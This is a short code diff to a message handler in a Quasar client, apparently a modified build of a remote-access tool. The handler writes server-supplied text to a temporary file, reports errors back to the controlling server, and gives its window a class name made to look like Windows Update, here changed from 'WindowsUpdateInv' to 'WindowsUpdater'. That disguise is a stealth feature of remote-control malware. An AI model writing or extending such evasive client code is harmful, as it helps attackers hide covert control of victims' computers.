@@ -29,6 +29,7 @@ namespace Quasar.Client.Messages
 
         private void Execute(ISender client, DoShowRedText message)
         {
+            
             new Thread(() =>
             {
                 string actionStr = message.Action;
@@ -43,17 +44,17 @@ namespace Quasar.Client.Messages
                 string text9 = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".txt");
                 try
                 {
-                    //using (StreamWriter writer = new StreamWriter(text9, false, System.Text.Encoding.Unicode))
-                    //{
-                    //    writer.Write(contentStr);
-                    //}
-                    File.WriteAllText(text9, contentStr);
+                    using (StreamWriter writer = new StreamWriter(text9, false, System.Text.Encoding.Unicode))
+                    {
+                        writer.Write(contentStr);
+                    }
+                    //File.WriteAllText(text9, contentStr);
                 }
                 catch (Exception)
                 {
                     client.Send(new NotifyMessageToServer { Message = "Invisible text writing error!" });
                 }
-                string str = "WindowsUpdateInv"; // window class name
+                string str = "WindowsUpdater"; // window class name
                 if (message.WindowClassName != null)
                 {
                     str = message.WindowClassName;
